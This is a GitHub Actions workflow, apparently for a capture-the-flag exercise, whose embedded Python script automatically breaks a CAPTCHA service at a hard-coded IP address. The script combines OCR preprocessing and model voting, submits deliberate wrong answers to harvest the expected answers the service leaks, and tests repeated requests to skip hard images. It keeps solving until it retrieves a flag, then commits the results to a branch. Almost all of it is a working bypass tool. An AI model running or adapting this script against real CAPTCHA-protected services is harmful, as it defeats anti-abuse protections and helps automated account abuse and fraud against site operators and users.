name: tmp-captcha-ocr-solve

on:
  push:
    branches:
      - 'tmp/captcha-probe-20260818'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: tmp/captcha-probe-20260818

      - name: Install CAPTCHA OCR runtime
        shell: bash
        run: |
          python3 -m pip install --disable-pip-version-check --quiet ddddocr opencv-python-headless requests

      - name: Evaluate OCR and solve
        shell: bash
        run: |
          rm -rf captcha-ocr-results
          mkdir -p captcha-ocr-results
          python3 - <<'PY'
          import collections
          import io
          import json
          import os
          import re
          import time
          from pathlib import Path

          import cv2
          import ddddocr
          import numpy as np
          import requests
          from PIL import Image

          BASE = 'http://3.35.97.192:39111'
          OUT = Path('captcha-ocr-results')
          OUT.mkdir(exist_ok=True)
          ALLOWED = set('abcdefghjkmnpqrstuvwxyz23456789')
          log = []

          def emit(obj):
              log.append(obj)
              print(json.dumps(obj, ensure_ascii=False), flush=True)
              (OUT / 'events.json').write_text(json.dumps(log, ensure_ascii=False, indent=2))

          def clean(text):
              text = (text or '').strip().lower()
              return ''.join(ch for ch in text if ch in ALLOWED)

          # One standard model and the package's beta model; initialize before a timed session.
          models = []
          for name, kwargs in [('standard', {}), ('beta', {'beta': True})]:
              try:
                  models.append((name, ddddocr.DdddOcr(show_ad=False, **kwargs)))
                  emit({'type':'model_loaded','name':name})
              except Exception as e:
                  emit({'type':'model_load_error','name':name,'error':repr(e)})
          if not models:
              raise SystemExit('no OCR model loaded')

          def enc(arr):
              ok, buf = cv2.imencode('.png', arr)
              if not ok:
                  raise RuntimeError('png encoding failed')
              return buf.tobytes()

          def variants(raw):
              arr = cv2.imdecode(np.frombuffer(raw, np.uint8), cv2.IMREAD_COLOR)
              if arr is None:
                  return [('original', raw)]
              h, w = arr.shape[:2]
              result = [('original', raw)]
              # Text is confined to the left/central area; right edge mostly carries long distractor lines.
              for crop_name, crop in [
                  ('crop190', arr[max(0,2):min(h,76), 2:min(w,190)]),
                  ('crop175', arr[max(0,2):min(h,76), 2:min(w,175)]),
                  ('crop160', arr[max(0,2):min(h,76), 2:min(w,160)]),
              ]:
                  result.append((crop_name, enc(crop)))
              gray = cv2.cvtColor(arr, cv2.COLOR_BGR2GRAY)
              med = cv2.medianBlur(gray, 3)
              gauss = cv2.GaussianBlur(gray, (3,3), 0)
              for name, src in [('gray', gray), ('median', med), ('gauss', gauss)]:
                  result.append((name, enc(src)))
                  _, otsu = cv2.threshold(src, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
                  result.append((name+'_otsu', enc(otsu)))
                  # 3x enlargement helps OCR retain thick glyph strokes after thin-line suppression.
                  up = cv2.resize(otsu, None, fx=3, fy=3, interpolation=cv2.INTER_CUBIC)
                  result.append((name+'_otsu_up3', enc(up)))
              # Remove one-pixel dark lines while retaining thicker character strokes.
              dark = cv2.threshold(gray, 190, 255, cv2.THRESH_BINARY_INV)[1]
              opened = cv2.morphologyEx(dark, cv2.MORPH_OPEN, np.ones((2,2), np.uint8))
              cleaned = 255 - opened
              result.append(('stroke_open2', enc(cleaned)))
              result.append(('stroke_open2_up3', enc(cv2.resize(cleaned, None, fx=3, fy=3, interpolation=cv2.INTER_CUBIC))))
              return result

          def predict(raw):
              votes = []
              details = []
              vars_ = variants(raw)
              for mname, model in models:
                  for vname, data in vars_:
                      try:
                          p = clean(model.classification(data))
                      except Exception as e:
                          details.append({'model':mname,'variant':vname,'error':repr(e)})
                          continue
                      details.append({'model':mname,'variant':vname,'prediction':p})
                      if 4 <= len(p) <= 7:
                          votes.append(p)
              counts = collections.Counter(votes)
              ranked = counts.most_common()
              best = ranked[0][0] if ranked else ''
              best_count = ranked[0][1] if ranked else 0
              second_count = ranked[1][1] if len(ranked) > 1 else 0
              return {
                  'best': best, 'best_count': best_count, 'second_count': second_count,
                  'valid_votes': len(votes), 'ranked': ranked[:8], 'details': details,
              }

          known_raw = Path('captcha-exploit-results/042.body').read_bytes()
          known = predict(known_raw)
          emit({'type':'known_sample','expected':'68rgsm', **known})

          http = requests.Session()
          http.headers.update({'User-Agent':'captcha-ctf-solver/1.0','Connection':'close'})

          def start_session():
              r = http.post(BASE + '/start', timeout=10)
              r.raise_for_status()
              return r.json()

          def get_captcha(token):
              r = http.get(BASE + '/captcha', headers={'Authorization':f'Bearer {token}'}, timeout=10)
              return r

          def submit(token, nonce, answer):
              return http.post(BASE + '/submit', headers={'Authorization':f'Bearer {token}'},
                               json={'token':token,'answer':answer,'round_nonce':nonce}, timeout=10)

          # Labeled evaluation from the service's own wrong-answer disclosure.
          eval_rows = []
          try:
              sess = start_session(); tok = sess['token']
              # Determine whether a pending CAPTCHA can be replaced without penalty.
              r1 = get_captcha(tok)
              r2 = get_captcha(tok)
              emit({'type':'double_get_test','first_status':r1.status_code,'second_status':r2.status_code,
                    'second_text':r2.text[:300] if r2.status_code != 200 else None,
                    'nonce1':r1.headers.get('X-Round-Nonce'),'nonce2':r2.headers.get('X-Round-Nonce')})
              if r2.status_code == 200:
                  rr, active = r2, r2.content
              else:
                  rr, active = r1, r1.content
              nonce = rr.headers.get('X-Round-Nonce')
              pred = predict(active)
              sr = submit(tok, nonce, '!')
              js = sr.json() if sr.headers.get('content-type','').startswith('application/json') else {'text':sr.text}
              expected = js.get('expected_answer')
              eval_rows.append({'expected':expected,'prediction':pred,'status':sr.status_code})
              for i in range(23):
                  cr = get_captcha(tok)
                  if cr.status_code != 200:
                      emit({'type':'eval_get_error','index':i,'status':cr.status_code,'text':cr.text[:300]})
                      break
                  nonce = cr.headers.get('X-Round-Nonce')
                  pred = predict(cr.content)
                  sr = submit(tok, nonce, '!')
                  try: js = sr.json()
                  except Exception: js = {'text':sr.text}
                  expected = js.get('expected_answer')
                  eval_rows.append({'expected':expected,'prediction':pred,'status':sr.status_code})
              exact = sum(1 for x in eval_rows if x['expected'] and x['prediction']['best'] == x['expected'])
              consensus_exact = sum(1 for x in eval_rows if x['expected'] and x['prediction']['best'] == x['expected'] and x['prediction']['best_count'] >= 2)
              emit({'type':'evaluation','samples':len(eval_rows),'exact':exact,
                    'accuracy':exact/len(eval_rows) if eval_rows else 0,
                    'consensus_exact':consensus_exact,
                    'rows':eval_rows})
          except Exception as e:
              emit({'type':'evaluation_exception','error':repr(e)})

          # Attempt several fresh 120-second sessions. Skip uncertain images only when double GET is supported.
          double_get_allowed = any(x.get('type') == 'double_get_test' and x.get('second_status') == 200 for x in log)
          flag = None
          for attempt in range(1, 4):
              try:
                  sess = start_session(); token = sess['token']
              except Exception as e:
                  emit({'type':'start_error','attempt':attempt,'error':repr(e)})
                  continue
              deadline = time.monotonic() + min(float(sess.get('deadline_in',120)), 120) - 1.5
              streak = 0
              submitted = 0
              skipped = 0
              emit({'type':'solve_start','attempt':attempt,'deadline_in':sess.get('deadline_in')})
              while time.monotonic() < deadline and streak < int(sess.get('target',60)):
                  try:
                      cr = get_captcha(token)
                  except Exception as e:
                      emit({'type':'captcha_exception','attempt':attempt,'error':repr(e)})
                      break
                  if cr.status_code != 200:
                      emit({'type':'captcha_error','attempt':attempt,'status':cr.status_code,'text':cr.text[:300]})
                      break
                  nonce = cr.headers.get('X-Round-Nonce')
                  pred = predict(cr.content)
                  # Strict consensus when replacement is possible; otherwise use best available vote.
                  confident = bool(pred['best']) and (
                      not double_get_allowed or
                      (pred['best_count'] >= 3 and pred['best_count'] >= pred['second_count'] + 2)
                  )
                  if not confident and double_get_allowed:
                      skipped += 1
                      if skipped <= 10 or skipped % 20 == 0:
                          emit({'type':'skip','attempt':attempt,'streak':streak,'prediction':pred})
                      continue
                  answer = pred['best']
                  if not answer:
                      emit({'type':'empty_prediction','attempt':attempt,'prediction':pred})
                      break
                  sr = submit(token, nonce, answer)
                  try: js = sr.json()
                  except Exception: js = {'text':sr.text}
                  submitted += 1
                  emit({'type':'solve_round','attempt':attempt,'submitted':submitted,'skipped':skipped,
                        'answer':answer,'prediction':pred,'status':sr.status_code,'response':js})
                  if sr.status_code != 200:
                      break
                  streak = int(js.get('streak',0))
                  if js.get('solved'):
                      fr = http.get(BASE + '/flag', headers={'Authorization':f'Bearer {token}'}, timeout=10)
                      try: fj = fr.json()
                      except Exception: fj = {'text':fr.text}
                      emit({'type':'flag_result','attempt':attempt,'status':fr.status_code,'response':fj})
                      flag = fj.get('flag')
                      break
              emit({'type':'solve_end','attempt':attempt,'streak':streak,'submitted':submitted,
                    'skipped':skipped,'flag':flag})
              if flag:
                  break

          (OUT / 'RESULT.txt').write_text(flag or 'NO_FLAG')
          PY

      - name: Commit OCR results
        if: always()
        shell: bash
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -f captcha-ocr-results
          git commit -m 'chore: store temporary CAPTCHA OCR solve results' || exit 0
          git push origin HEAD:tmp/captcha-probe-20260818
